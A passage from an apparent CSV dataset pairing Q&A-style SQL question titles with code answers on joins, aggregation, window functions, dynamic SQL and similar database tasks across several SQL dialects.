        WHERE STATUS = 'Active' 
      ) ADDR_DATA
   ON TABLE1.PERSON_ID = ADDR_DATA.PERSON_ID 
      AND TABLE1.CUSTOMER_INSTITUTION_ID = 966362 
WHEN MATCHED THEN 
   UPDATE
      SET PAYEE_ADDRESS1 = ADDR_DATA.ADDRESS_LINE1, 
          PAYEE_ADDRESS2 = ADDR_DATA.ADDRESS_LINE2, 
          PAYEE_CITY = ADDR_DATA.CITY, 
          PAYEE_STATE_PROVINCE = ADDR_DATA.STATE_PROVINCE,
          PAYEE_POSTALCODE = ADDR_DATA.ZIP, 
          PAYEE_COUNTRY_CODE = 'USA';
"
35024,69393,Using sum with a nested select,"SELECT
  m.menuname,
  p.productname,
  t.amount
FROM [web].[dbo].[tblMenus] m
  FULL JOIN [web].[dbo].[tblProductsRelMenus] pm ON m.Id = pm.MenuId
  FULL JOIN [web].[dbo].[tblProducts] p ON pm.ProductId = p.ProductId
  LEFT JOIN (
    SELECT ProductId, SUM(Amount) as amount
    FROM [web].[dbo].[tblOrderDetails]
    GROUP BY ProductId
  ) t ON p.ProducId = t.ProductId
"
16928,2876,Paging and locking in Oracle,"SQL> create table t as select object_id, owner, object_name, created from all_objects where rownum <= 100;

Table created.

SQL> 
SQL> select *
  2    from t
  3   where rowid in
  4         (select rid
  5            from (select rowid rid, row_number() over(order by object_id) rn from t)
  6           where rn between 11 and 20)
  7     for update;

OBJECT_ID OWNER OBJECT_NAM CREATED
--------- ----- ---------- ---------
       20 SYS   ICOL$      06-MAR-11
       15 SYS   UNDO$      06-MAR-11
       17 SYS   FILE$      06-MAR-11
       13 SYS   UET$       06-MAR-11
       19 SYS   IND$       06-MAR-11
       14 SYS   SEG$       06-MAR-11
       21 SYS   COL$       06-MAR-11
       16 SYS   TS$        06-MAR-11
       12 SYS   FET$       06-MAR-11
       18 SYS   OBJ$       06-MAR-11

10 rows selected.
"
38909,63522,sum up the data from today specific data to the next day data and the rest of the data,"set dateformat dmy
declare @t table(DATE  date,     hour int,  data1  int, data2 int)
insert into @t
select '01/01/2010',  1,    10860,  1234     union all
select '01/01/2010',  2,    10861,  1234     union all
select '01/01/2010',  3,    10862,  1234     union all
select '01/01/2010',  4,    10863,  567    union all
select '01/01/2010',  5,    10864,  458     union all
select '02/01/2010',  1,    10865,  3467     union all
select '02/01/2010',  2,    10866,  7890     union all
select '02/01/2010',  3,    10867,  863     union all
select '02/01/2010',  4,    10868,  0     union all
select '02/01/2010',  5,    10868,  698   union all
select '03/01/2010',  1,    10868,  4693   union all
select '03/01/2010',  2,    10868,  7853   union all
select '03/01/2010',  3,    10868,  5987 

select dateadd(day,case when hour>1 then 1 else 0 end,date),
sum(data1),sum(data2) 
from @t
group by dateadd(day,case when hour>1 then 1 else 0 end,date)
"
511,45729,SQL Server - How to filter rows based on matching rows?,"SELECT
  AccountID
 ,MIN(SDIStatus) AS MinSDIStatus
INTO #MinTable
FROM #tempTBRB
GROUP BY AccountID

SELECT *
FROM #tempTBRB T
JOIN #MinTable M ON
     T.AccountID = M.AccountID
     AND T.SDIStatus = M.MinSDIStatus

DROP TABLE #MinTable
"
7069,18257,Conversion failed when converting the varchar value to data type int,"Declare @PostalCode varchar(1000)=0
    set @PostalCode ='7005036,7004168,7002314,7001188,6998955'

declare @sql nvarchar(4000)  //didn't count the chars...

select @sql = N'Select hl.* From CountryLocation cl
INNER JOIN refPostalCodes pc ON pc.PostalCode = hl.PostalCode
where pc.Postalcode in (' + @PostalCode + ') and pc.notDeleted = 1'

exec sp_executesql @sql
"
30162,1002,Convert Seconds to Hours and Minutes,"SELECT EventDate, OriginalSeconds, 
LEFT(CONVERT(VARCHAR(5),
DATEADD(second, OriginalSeconds/100, 0), 108), 5)
"
29031,47156,Wildcard character in field delimiter - reading .csv file,"sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
"
22237,5966,SQL: generate incrementing integer based on value of another column,"insert into target
select
   ForeignID
  ,row_number()
   over (partition by ForeignID order by Detail) 
  ,Detail 
from source
"
24018,62763,SQL Server : Select from two tables with default value 0,"select B.caseNumber, ISNULL(count(C.checkupNumber) ,0)
from BaseTable B
left join Checkup C
on B.caseNumber = C.caseNumber
where B.patientId ='P201'
group by B.caseNumber
"
8734,39672,Selecting the most recent row by timestamp for multiple entries while joining another table with substring of the current one,"select sn, sv, sst, st 
  from (
    with st as (
      select 
          substr(ServiceIdentifier, 1, instr(ServiceIdentifier, '-')-1) syst,
          substr(ServiceIdentifier, instr(ServiceIdentifier, '-')+1) service, 
          ServiceStatusTable.*
        from ServiceStatusTable)
    select sn.systemname sn, st.service sv, st.servicestatus sst, st.servicetime st,
        row_number() over (partition by systemname, service 
          order by st.servicetime desc) rn
      from st join Systemnametable sn on st.syst = sn.systemidentifier )
  where rn = 1
"
31028,67955,LINQ to SQL Query,"bool eventVoucherUsed = 
     getAllBookings.Any(r => r.EventID == booking.EventID 
                   && r.Voucher != null 
                   && booking.VoucherStatus == true);
"
18503,46106,Issue with Subquery in Where Clause,"Select left([Foundation_Account_Name],4)
From [dbo].[tbl_Foundation_Account]    
INTERSECT 
Select left([Foundation Account Name],4) 
From [dbo].[Import_tbl_RDO]
Where [Foundation Account Name] IS NOT NULL
"
597,26199,Join two tables based on relationship defined in third table,"SELECT Activity.ActivityText as Activity, Action.ActionText as ApplicableAction
FROM ActivityAction
    INNER JOIN Activity
        ON ActivityAction.ActivityId = Activity.ActivityId
    INNER JOIN Action 
        ON ActivityAction.ActionId = Action.ActionId
"
1725,34989,storing latitude and longitude for a route,"SELECT R.LATITUDE, R.LONGITUDE
FROM TEMP T INNER JOIN ROUTE R ON T.ROUTEID = R.ROUTEID
WHERE T.UserID =1
ORDER BY R.ORDER ASC
"
33117,69094,Insert rows in table while maintaining IDs,"DECLARE @ID int
DECLARE @Description VARCHAR(MAX)

DECLARE my_cursor CURSOR FOR 
  SELECT ID, Description FROM TableB
OPEN my_cursor

FETCH NEXT FROM my_cursor
INTO @ID, @Description

WHILE @@FETCH_STATUS = 0
BEGIN
    INSERT into TableA(MasterCategoryID, MasterCategoryDesc)
    SELECT CASE WHEN @Description NOT IN (SELECT MasterCategoryDesc FROM TableA) 
           THEN (SELECT MAX(MasterCategoryID)+1 FROM TableA)
           ELSE (SELECT TOP 1 MasterCategoryID 
                 FROM TableA 
                 WHERE MasterCategoryDesc = @Description)
           END AS MasterCategoryID, Description as MasterCategoryDesc
    FROM TableB
    WHERE ID = @ID

    FETCH NEXT FROM my_cursor
    INTO @ID, @Description
END
"
11984,73765,Flatten table rows by combining certain values into columns,"select foo.orgname, max(foo.Admin1), max(foo.Admin2)
from   (SELECT dbo.Organization.OrganizationName as orgname,
               CASE WHEN (dbo.OrganizationUser.AdminOrder = 1) THEN dbo.OrganizationUser.UserID ELSE '' END AS Admin1,
               CASE WHEN (dbo.OrganizationUser.AdminOrder = 2) THEN dbo.OrganizationUser.UserID ELSE '' END AS Admin2
        FROM   dbo.Organization 
         INNER JOIN dbo.OrganizationUser ON dbo.OrganizationUser.OrganizationId = dbo.Organization.OrganizationId
        WHERE  dbo.OrganizationUser.UserType = 'ADMIN') foo
group  by foo.orgname
"
1348,37627,How should I pass a table name into a stored proc?,"CREATE PROC spCountAnyTableRows( @PassedTableName as NVarchar(255) ) AS
-- Counts the number of rows from any non-system Table, *SAFELY*
BEGIN
    DECLARE @ActualTableName AS NVarchar(255)

    SELECT @ActualTableName = QUOTENAME( TABLE_NAME )
    FROM INFORMATION_SCHEMA.TABLES
    WHERE TABLE_NAME = @PassedTableName

    DECLARE @sql AS NVARCHAR(MAX)
    SELECT @sql = 'SELECT COUNT(*) FROM [' + @ActualTableName + '];'

    EXEC(@SQL)
END
"
12317,56089,How to aggregate the daily temperature data into weekly data?,"SELECT city, to_char(day,'iw'), max(high), min(low), sum(NVL(count,0)),
       max(first) keep (dense_rank first order by day) as first,
       max(last) keep (dense_rank last order by day) as last
FROM dailyX
WHERE day > to_date(20140101,'YYYYMMDD')
GROUP BY city, to_char(day,'iw');
"
37809,25118,Update multiple rows for 2 columns in MySQL,"UPDATE categories
SET display_order = CASE id
    WHEN 1 THEN 32
    WHEN 2 THEN 33
    WHEN 3 THEN 34
END,
title = CASE id
    WHEN 1 THEN 'New Title 1'
    WHEN 2 THEN 'New Title 2'
    WHEN 3 THEN 'New Title 3'
END
WHERE id IN (1,2,3)
"
27633,60419,Trouble Creating a view in MySQL,"CREATE VIEW `VIDEOS_view` AS 
SELECT `tbl_videos`.`videos_id` AS `videos_id`,
`tbl_videos`.`date` AS `date`,
`tbl_videos`.`author` AS `author`,
`tbl_videos`.`photo_credit` AS `photo_credit`,
(select category_videos_name from tbl_categories_videos where category_videos_id = tbl_videos.category_id_1) AS `category_1`,
(select category_videos_name from tbl_categories_videos where category_videos_id = tbl_videos.category_id_2) AS `category_2`,
`tbl_videos`.`thumb` AS `thumb`,
`tbl_videos`.`image_1` AS `image_1`,
`tbl_videos`.`video_embed` AS `video_embed`,
`tbl_videos`.`title` AS `title`,
`tbl_videos`.`sub_title` AS `sub_title`,
`tbl_videos`.`section_1` AS `section_1`,
`tbl_videos`.`section_2` AS `section_2`,
`tbl_videos`.`embed` AS `embed`
FROM `tbl_videos`
"
22312,23541,Combine two update queries into single case MySQL,"update product_varities pv
set pv.quantity = pv.quantity + iquantity, 
    pv.status = case when pv.quantity > 0 then 1 else 0 end
where pv.article_id = iarticleid
    and pv.size_category_id = isize;
"
30797,4716,How to calculate End and start Week?,"SELECT columnname - (DATEPART(WEEKDAY, columnname) - 1) AS week_start
FROM Table1
"
11935,60596,"Select distinct value from one column, using another for ordering","select [Name], max([Score])
from t1
group by [Name]
"
13259,31294,Microsoft SQL Server : max records in a column,"SELECT table.*
FROM dbo.X table
WHERE row_numbers IN (SELECT MAX(row_numbers) FROM dbo.X)
"
36492,16288,Query to list SQL Server stored procedures along with lines of code for each procedure,"select t.sp_name, sum(t.lines_of_code) - 1 as lines_ofcode, t.type_desc
from
(
    select o.name as sp_name, 
    (len(c.text) - len(replace(c.text, char(10), ''))) as lines_of_code,
    case when o.xtype = 'P' then 'Stored Procedure'
    when o.xtype in ('FN', 'IF', 'TF') then 'Function'
    end as type_desc
    from sysobjects o
    inner join syscomments c
    on c.id = o.id
    where o.xtype in ('P', 'FN', 'IF', 'TF')
    and o.category = 0
    and o.name not in ('fn_diagramobjects', 'sp_alterdiagram', 'sp_creatediagram', 'sp_dropdiagram', 'sp_helpdiagramdefinition', 'sp_helpdiagrams', 'sp_renamediagram', 'sp_upgraddiagrams', 'sysdiagrams')
) t
group by t.sp_name, t.type_desc
order by 1
"
1296,50344,SQL performance on one column,"  ....
  WHERE isActive;
"
12137,38321,Row with the highest ID,"SELECT
    * --TODO - Pick columns
FROM
    (
       SELECT ID,[Date],Total,ROW_NUMBER() OVER (PARTITION BY [Date] ORDER BY ID desc) rn
       FROM [Table]
    ) t
WHERE
   rn = 1
"
28195,11357,How to return results for a query using pivot or something similar,"SELECT
  receiver.country    AS r_country,
  sender.country      AS s_country,
  data.Sender         AS s_name,
  data.Receiver       AS r_name,
  data.msg            AS msg,
  data.date           AS date
FROM
  TableB              AS data
LEFT JOIN
  TableA              AS sender
    ON sender.EmployeeName = data.Sender
LEFT JOIN
  TableA              AS receiver
    ON receiver.EmployeeName = data.Receiver
"
34040,28747,Hibernate partially fill objects,"SELECT new SomeData(c.name, c.code, c.address) FROM SomeData c
"
13515,43919,SQL Server auto increment a column without primary key,"CREATE TABLE T
(
X INT PRIMARY KEY,
Y INT IDENTITY(1,1)
)
"
4232,46328,"SELECT statement SQL Server (full text) similar to ""CONTAINS(column, 'term1 or term 2 or term3') AND NOT (anything else)""","   SELECT * FROM Table WHERE CONTAINS(Col1, 'apples or strawberries')
                           AND (Col1 NOT LIKE '%[^ apples or strawberries ]%');
"
12007,52576,Select the sum of the column with the higher value in reach row,"SELECT SUM(CASE WHEN a > b THEN a ELSE b END)
FROM table
"
17480,13462,Coalesce usage confusion,"SELECT max(user_id) FROM users WHERE name='Bob'
"
33841,33226,How can I find if a column is auto_increment in mysql?,"select * from COLUMNS where  TABLE_SCHEMA='yourschema' and TABLE_NAME='yourtable' and EXTRA like '%auto_increment%'
"
12143,54659,SQL server collation concept in join?,"SELECT * 
FROM dbo.Table1 t1
JOIN dbo.Table2 t2 ON t1.KeyCD COLLATE DATABASE_DEFAULT = t2.KeyCD COLLATE DATABASE_DEFAULT 
"
10029,49788,mySQL searching for multi accounters,"SELECT
    GROUP_CONCAT(a.username SEPARATOR ' & ') as username,
    a.ipaddr
FROM (select distinct username,ipaddr from logs) AS a
GROUP BY a.ipaddr
HAVING count(*) > 1
ORDER BY a.ipaddr
"
23427,599,How to execute a SELECT on a table with a list of composite keys?,"SELECT * 
FROM tbl1
WHERE (ID1,ID2) IN ((1,1) (1,2) (2,4) (2,1) (3,1) (3,2) (3,5));
"
6077,55916,combine two columns only if both column has value in it,"SELECT CustFName + ' ' + JointCustFName as [BothName]
FROM table
WHERE custFName IS NOT NULL and JointCustFName IS NOT NULL
      and custFNAME <> '' and JointCustFName <> ''
"
5460,65546,Selecting most recent answers efficiently,"SELECT T.EventId, T.MemberId, T.TimeStamp, T.Answer
FROM TableName T
 JOIN (
   SELECT EventId, MemberId, Max(Timestamp) MaxTimeStamp
   FROM TableName
   GROUP BY EventId, MemberId ) T2 ON T.EventId = T2.EventId 
    AND T.MemberId = T2.MemberId 
    AND T.TimeStamp = T2.MaxTimeStamp
"
15079,41584,Fix duplicate entries in mysql table,"UPDATE Coords SET propertyID = propertyID - 1 WHERE propertyID > 4271
"
8025,55966,How to eliminate duplication with two columns in a table,"select t1.*
from MyTable t1
left outer join MyTable t2 on t1.No1 = t2.No2 and t1.No2 = t2.No1
where t2.No2 is null
    or t1.No1 <= t2.No1
"
11965,29934,many-to-many query mysql,"SELECT name, file FROM users,userfiles, files WHERE users.id = userfiles.usrid AND usersfiles.fileid = files.id;
"
17576,25834,Populate a single SQL Server column with data from multiple columns and add prefix to value,"with cte as (
    select T.Emp_ID, C.Value
    from Table1 as T
        outer apply (values
            ('A,' + cast(T.Emp_ID as varchar(max))),
            ('B,' + T.Status),
            ('C,' + convert(varchar(10), T.hire_date, 103))
        ) as C(Value)
)
-- insert into Table2
select
    row_number() over(order by Emp_ID, Value) as p_id,
    Value
from cte
"
34517,54089,How can I SUM up all prices according to its sales_order_id (MySQL),"SELECT bsb.ORDER_ID AS order_id, SUM(bsb.PRICE) AS product_price, '' AS order_total
FROM b_sale_basket bsb
INNER JOIN b_sale_order bso ON bso.ID = bsb. ORDER_ID
INNER JOIN b_sale_delivery bsd ON bso.DELIVERY_ID = bsd.ID
INNER JOIN b_sale_pay_system bsps ON bso.PAY_SYSTEM_ID = bsps.ID
WHERE bsb.ORDER_ID IN (255, 300)
GROUP BY bsb.ORDER_ID
"
9231,9511,Deleting partial data from a field in MySQL,"UPDATE table SET fieldname = REPLACE(fieldname, '<p>This is a test</p>', '');
"
21706,1725,How select a grouping of matching values from a table?,"select distinct
(
    STUFF 
    (
        (
            SELECT ',' + Feature
            FROM SiteFeatures t2
            WHERE  t1.SiteUrl = t2.SiteUrl
            ORDER BY Feature
            FOR XML PATH(''), TYPE, ROOT
        ).value('root[1]','nvarchar(max)')
        ,1,1,''
    )
) as chars
from SiteFeatures t1;
"
31006,22720,Want to select data from each group,"select * from your_table
where eid in
(
    select eid 
    from your_table
    group by eid
    having sum(case when involvement not in ('Amanda','Dina') then 1 else 0 end) = 0
)
and involvement in ('Amanda','Dina')
"
24876,63488,SQL: Find diff between two tables with non-unique feature IDs?,"SELECT a.feature_id, b.feature_id, a.language, b.language
FROM [table 1] a FULL OUTER JOIN [table 2] b on a.feature_id = b.feature_id 
    and a.language = b.language
WHERE a.feature_id is null or b.feature_id is null
"
1407,33002,SQL: How to force the relational operator to consider NULL values,"WHERE IFNULL(a.entity_id, 0) = IFNULL(b.entity_id, 0);
"
11556,45684,How to combine those three SQL queries,"with cte1 as
(
select   vwemployee.directorateName   , count(vwemployeeCourse.employeeId) as t1 

from vwemployee , vwemployeeCourse 

where  vwemployee.directorateName = vwemployeeCourse.directorateName 

GROUP BY vwemployee.directorateName
)
,cte2 as
(
select vwemployee.directorateName , count(vwemployee.directorateName) as t2 

from vwemployee , employeeCourse

where vwemployee.Id = employeeCourse.employeeId 

GROUP BY  vwemployee.directorateName
)
,cte3 as
(
 select vwemployeeCourse.directorateName , sum(vwCourse.cost) as t3

 from vwemployeeCourse , vwCourse

 where vwemployeeCourse.courseId = vwCourse.Id

 group by vwemployeeCourse.directorateName 
)
select cte1.directorateName, cte1.t1, cte2.t2, cte3.t3
from
cte1 inner join cte2 
on cte1.directorateName = cte2.directorateName
inner join cte3 on
cte2.directorateName = cte3.directorateName
"
18866,45913,Writing an Oracle SQL Query,"SELECT [FIRST], [LAST], COUNT(mm_rental.member_id) 
AS ""MAXIMUM MOVIES"" FROM mm_member JOIN mm_rental 
ON mm_rental.member_id = mm_member.member_id
group by [FIRST], [LAST];
"
30176,73469,"Performing INNER JOIN, GROUP BY, and COUNT on Django models","from django.db.models import Count
User.objects.all().annotate(bids=Count('auctionbids')).order_by('bids')
"
28701,31778,select based on one field association with multiple values in another field,"select id, car, color from test2
where car in (
    select car 
    from test2 
    group by car 
    having count(distinct color) > 1
)

select id, car, color from test2 t
where exists (
    select car 
    from test2 
    where car = t.car
    group by car 
    having count(distinct color) > 1
)
"
23159,6210,Rails Active Record: How to reduce number of trips to database?,"friend_ids = @fb_friends.map(&:id)
authorizations = Authorization.where('provider = ? AND uid IN (?)','facebook',friend_ids)
@fb_friends_on_cody = authorizations.map(&:user_id)
@fb_friends.delete_all('id in (?)', @fb_friends_on_cody)
"
38790,57255,Update Count on Date wise in Oracle,"WITH MainFilter(CLI,DAYS,COUNTS)
AS (SELECT TBL_DTL_CALLACTIVITY.CLI,
TO_CHAR(TBL_DTL_CALLACTIVITY.CALLSTARTTIME, 'DD'),COUNT(TBL_DTL_CALLACTIVITY.CLI)
FROM TBL_DTL_CALLACTIVITY 
WHERE  UPPER(TO_CHAR(TBL_DTL_CALLACTIVITY.CALLSTARTTIME, 'mon')) =UPPER(i_Month) AND
(SELECTED_DNIS IS NULL OR TBL_DTL_CALLACTIVITY.DNIS = SELECTED_DNIS) 
GROUP BY TBL_DTL_CALLACTIVITY.CLI,
TO_CHAR(TBL_DTL_CALLACTIVITY.CALLSTARTTIME,'DD'))
SELECT MF.CLI,
NVL((SELECT COUNTS FROM MainFilter WHERE MainFilter.DAYS = '01' AND CLI  = MF.CLI ),0)     AS  Day_01,
NVL((SELECT COUNTS FROM MainFilter WHERE MainFilter.DAYS = '02' AND CLI  = MF.CLI ),0) AS  Day_02,
NVL((SELECT COUNTS FROM MainFilter WHERE MainFilter.DAYS = '03' AND CLI  = MF.CLI ),0) AS  Day_03,
--------------------
--------------------
FROM MainFilter MF GROUP BY MF.CLI ;
"
39502,59561,Creating trigger in oracle for preventing duplicate keys before inserting cmd,"create or replace 
TRIGGER t1_trigger
BEFORE INSERT
ON T1
FOR EACH ROW
DECLARE 
cursor c1 is select id from t1 where id = :new.id;
BEGIN
  for i in c1 loop
        :new.id := 'p_' || :new.id;
    end loop;
END;
"
32918,23417,retrieve available day from date rante,"SELECT employees.uid, name, date
FROM users
LEFT JOIN storelocation ON employees.uid = storelocation.uid
LEFT JOIN schedule ON emplyees.uid = schedule.uid
WHERE slid =9308
AND date BETWEEN '2009-11-10' AND '2009-12-20'
AND employees.uid NOT IN (
    SELECT uid
    FROM schedule
    WHERE date = '2009-11-11'
)
"
37275,28288,SQL query left join where clause,"  SELECT
    p.id,
    p.code,
    IFNULL(SUM(ordered_item.quantity) , 0) as purchases ,     
    sum((p.price - p.price_purchase) * ordered_item.quantity) as value
  FROM
   products p
   LEFT JOIN (
      SELECT
        sol.related_id AS related_id,
        sol.quantity AS quantity
      FROM
        shop_orders_lines sol
        INNER JOIN shop_orders so
          ON so.id = sol.order_id
      WHERE
        so.status IN ('paid', 'processing', 'sent', 'ready_for_pickup', 'picked_up')
          AND so.deleted = 0
          AND sol.related_model = 'products'  
    ) ordered_item
      ON ordered_item.related_id = p.id
GROUP BY p.id
"
33807,75128,Database design for images,"SELECT COALESCE( b.image, p.imagedata )
FROM buddy b, predefined_images p 
WHERE b.imageID = p.ID
"
20895,10160,Query a list of names from one table that appear in a field in a different table,"  SELECT a.names,
         COUNT(b.titles) AS num
    FROM TABLE_2 a
    JOIN TABLE_1 b ON INSTR(b.title, a.names) > 0
GROUP BY a.names
ORDER BY num DESC
"
37232,5055,Adding Punctuation Marks in SQL,"SELECT 'Frank''s Oracle site' AS text FROM DUAL;
"
5455,59419,Time apart in PostgreSQL,"SELECT ABS(EXTRACT(EPOCH FROM (a.timefield - b.timefield))) AS ""Time Apart"" FROM a INNER JOIN b ON (a.id = b.id);
"
7807,59979,Creating CSV string in TSQL,"select t.name, t.value1,
       stuff((select ',' + cast(t2.value2 as varchar(8000))
              from table t2
              where t2.name = t.name
              order by t2.value1
              for xml path ('')
             ), 1, 1, '') as value2_csv
from table t;
"
922,73683,Can I set multiple variables value in single query?,"select top 1
    @contentsType = mi.type_id,
    @itemID = mi.item_id,
    @dealerID = mi.dealer_id,
    @userID = mi.user_id
from #tempResults as tr
left join [myDB].[dbo].myTable mi on tr.item_id = mi.id;

select top 1 @itemID = id from #tempResults
"
13137,1378,Pattern matching email address in SQL Server,"WHERE address LIKE '%[^aeiouy][^aeiouy][^aeiouy][^aeiouy]@%'
"
39786,52581,Update a table that column names are unknown,"DECLARE @columnNames NVARCHAR(4000) 
DECLARE @idfrom int, @idto int
DECLARE @table nvarchar(50)
SET @table = 'MY_TABLE'
SET @idfrom = 5 -- id you are copying from
SET @idto = 2   -- id you are copying to

DECLARE @sqlstring nvarchar(max)

SELECT @columnNames = coalesce(@columnNames, 'SET ') + '[' + COLUMN_NAME + ']=t2.' + '[' + COLUMN_NAME + '],'
FROM INFORMATION_SCHEMA.Columns 
WHERE TABLE_NAME = @table AND COLUMN_NAME NOT IN ('id') 
ORDER BY COLUMN_NAME 

SET @sqlstring = 'update t1 ' +stuff(@columnNames, len(@columnNames),1,'') + ' 
FROM @t t1
join @t t2 on t1.id =' + cast(@idto as varchar) + '
and t2.id = ' + cast(@idfrom as varchar)

EXEC( @sqlstring )
"
33619,10161,Randomly Assign Records From One Table to Another,"select *
from
 (
   select dt.*, row_number() over (order by t1.r) as rn
   from
    ( 
      select t1.*, RANDOM(1,1000000) as r from t1
    ) as dt
 ) as a
join
 (
   select dt.*, row_number() over (order by t1.r) as rn
   from
    ( 
      select t2.*, RANDOM(1,1000000) as r from t2
    ) as dt
 ) as b   
  on a.rn = b.rn
"
39010,16005,TERADATA Creating Group ID from Rolling SUM Limit,"SELECT 
    PROD_id
,   COUNT(DISTINCT PROD_ID) AS QTY
,   SUM(QTY) OVER (ORDER BY QTY ROWS UNBOUNDED PRECEDING) RUNNING
,   WIDTH_BUCKET(RUNNING, 1, 120*2000000, 120) AS GRP_NBR
FROM TMP_WORK_DB.PROD_LIST
GROUP BY 1
"
18794,52465,What's the syntax for the create table statement in Excel?,"CREATE TABLE `sheetname` (
`DartNumber` VarChar (16)
, `ClientId` VarChar (10)
, `Population` VarChar (30))
"
2973,30414,How to join mysql query with multiple tables,"select a.*, b.*, c.* from 
    A a inner join B b on a.idB = b.id
        inner join C c on b.idC = c.id
"
1343,425,Using decode to input 'Not a valid month' value as it is,"select   number_column,
         case   when number_column between 10000 and 129999 
                     and mod(number_column,10000) between 1900 and 2100 
                then 'good format' 
                else 'bad format'
         end result
from
    (select 52002 number_column from dual union all
     select 41995 number_column from dual union all
     select 122016 number_column from dual union all
     select 0 number_column from dual union all
     select 10000 number_column from dual union all
     select 131994 number_column from dual union all
     select 421996 number_column from dual union all
     select 731989 number_column from dual )



 ╔════════╦═════════════╗
 ║  52002 ║ good format ║
 ║  41995 ║ good format ║
 ║ 122016 ║ good format ║
 ║      0 ║ bad format  ║
 ║  10000 ║ bad format  ║
 ║ 131994 ║ bad format  ║
 ║ 421996 ║ bad format  ║
 ║ 731989 ║ bad format  ║
 ╚════════╩═════════════╝
"
26370,24694,MySql get duplicate id where other column condition,"SELECT item_id FROM my_table 
WHERE image_id = 1 
  AND item_id IN (SELECT item_id FROM my_table GROUP BY item_id HAVING COUNT(*) > 1);
"
37908,44056,query to obtain maximum 3 results,"SELECT Date,code from (
(SELECT Date,max(Code) as code from YourTable
GROUP BY Date
ORDER BY Date DESC
)
WHERE rownum <= 3
"
8114,71225,MySQL: Select Record If Every Search Criteria Is Found in One of the Child Records,"DECLARE p_Statement NVARCHAR(MAX)
SELECT p_Statement = 'SELECT id FROM hotels WHERE 1 = 1 '

for each p_catID in SelectedCatIds (loop) :
    SELECT p_Statement = p_Statement + 'AND id IN (SELECT hotel_id FROM hotel_category_infos WHERE cat_id = p_catID '
(end loop)

PREPARE stmt FROM p_Statement
EXECUTE stmt
"
7078,41029,ORACLE SQL: Inserting another ID from another row,"DECLARE
    my_id int;
BEGIN
    INSERT INTO PUBLISHER (pub_name) VALUE ('ABC Publisher')
      RETURNING id INTO my_id;
    ...
END;
"
25752,75608,"Apply value specified for date range (from, to) to value in table containing single row per date","SELECT b.revenue, a.percent
FROM tbl_percents AS a
INNER JOIN tbl_revenue AS b
ON b.date BETWEEN a.from_date AND 
     CASE WHEN a.to_date = DATE(""0000-00-00"") THEN DATE(""2100-01-01"")
          ELSE a.to_date END
"
16874,49691,SQL: IF clause within WHERE clause,"WHERE OrderNumber LIKE
  CASE WHEN IsNumeric(@OrderNumber) = 1 THEN 
    @OrderNumber 
  ELSE
    '%' + @OrderNumber
  END
"
35208,64226,What is the best way to rewrite this query,"SELECT    [ProductType], 
          SUM(total) 
FROM      isss
GROUP BY  [ProductType]
"
20582,16853,MySQL - Adding a JOIN to existing query,"SELECT 
    p.photoID, 
    p.setID, 
    p.headline, 
    p.caption, 
    p.height, 
    p.width, 
    p.size, 
    p.copyright,
    pe.*
FROM 
    photos p
INNER JOIN
    (
        SELECT photoID 
        FROM photoSearch 
        WHERE MATCH (allPeople, allKeywords, shortCaption) AGAINST ('+byline' IN BOOLEAN MODE) 
        LIMIT 50
    ) pids ON p.photoID = pids.photoID
LEFT JOIN
    photoPeople pp ON p.photoID = pp.photoID
LEFT JOIN
    people pe ON pp.peopleID = pe.peopleID
"
14055,26409,Fractional day difference in Oracle,"SELECT sysdate - (sysdate -dbms_random.value(1,10)) FROM dual;
"
34605,1110,How to create an empty anonymous table in Postgres?,"select null::text as a, null::int as b
limit 0
"
18870,53139,How to check if table is empty in VB.net,"if (reader.HasRows)
{

    reader.Read();
    role = reader.GetString(1)

}
else
{
    // invalid login
}
"
25647,28781,Android Spinner Selected Item,"Spinner mySpinner = (Spinner)findViewbyId(R.id.spinner);
int position = mySpinner.getSelectedItemPosition();
String Text = yourCityList[position].toString(); // dont know which list is holding the city list... 
// i didn't use any db in any of my app so cant tell you how can you get list... 
// leaving it to you... :)
"
16400,33570,"Explicit syntax for select xxx from table1,table2","SELECT somefields FROM table1 CROSS JOIN table2
"
21133,33984,What are some useful ways to update column data based on two conditions?,"UPDATE HRBI
SET HRBI.PayGroupRegionCode =
    Switch
        (
            HRBI.CompensationGradeProfile IN
                    (
                        'Japan JPN',
                        'Taiwan TWN',
                        'China CNA',
                        'Australia AUS',
                        'Singapore SGP',
                        'Thailand THA'
                    ), 'APJ',
            HRBI.CompensationGradeProfile IN
                    (
                        'Luxembourg LUX',
                        'Romania ROU'
                    ), 'EMEA',
            True, HRBI.PayGroupRegionCode
        )
WHERE HRBI.PayGroupRegionCode = 'UNK';
"
21153,8920,How to create an auto increment primary key in SQLite,"CREATE TABLE Employee (
    Id integer primary key autoincrement,
    . . .
"
5997,33018,"MySQL Order_By date column and integer column, but specify ordering rules of integer column?","SELECT   *
FROM     `my_table`
ORDER BY CASE `integer` WHEN 2 THEN 1 ELSE 0 END DESC, `date` ASC
"
39249,22383,Oracle - getting row numbers for a group,"select to_char(d, 'yyyy'), to_char(d, 'mon'), to_char(d, 'dd'),
       count(1) over ( partition by extract(month from d)) as count
from (
        select to_date('01042016', 'ddmmyyyy') + level -1 as d
        from dual
        connect by level <= 61
     )
order by 1, 2, 3 
"
22669,28987,Oracle to_date procedure with different results,"TO_CHAR(date_column, '<desired_format>')
"
1933,11049,Counting two different fields from two different tables in one query,"select fac_name, [month], [year], max([#filled]) as [#filled], max(capacity) as [capacity]

from (

  select fac_name, datename(month,b.startdt) as 'month', year(b.startdt) as 'year', count(a.empfk) as '#filled', null as 'capacity'
  from tbl_tmx_attempt a  
  left outer join tbl_tmx_activity b on a.activityfk = b.activity_pk  
  left outer join tbl_tmx_actloc c on b.activity_pk = c.activityfk  
  left outer join loc d on c.locfk = d.loc_pk  
  left outer join fac e on d.loc_facfk = e.fac_pk  
  where b.startdt > '12/31/08'    
  group by fac_name, year(b.startdt), month(b.startdt), datename(month,b.startdt) 

  union all

  select fac_name, datename(month,b.startdt) as 'month', year(b.startdt) as 'year', null as '#filled', sum(b.maxcapacity) as 'capacity'  
  from tbl_tmx_activity b   
  left outer join tbl_tmx_actloc c on b.activity_pk = c.activityfk  
  left outer join loc d on c.locfk = d.loc_pk  
  left outer join fac e on d.loc_facfk = e.fac_pk  
  where b.startdt > '12/31/08'  
  group by fac_name, year(b.startdt), month(b.startdt), datename(month,b.startdt)  

  ) a

group by fac_name, [month], [year]
"
19117,73069,Used OFFSET in SQL Server 2012 and I need and answer for SQL Server 2008,"SET @msg = '<rptlr>' + (select * from (SELECT  RANK() OVER (ORDER BY VENDOR) AS rank,*
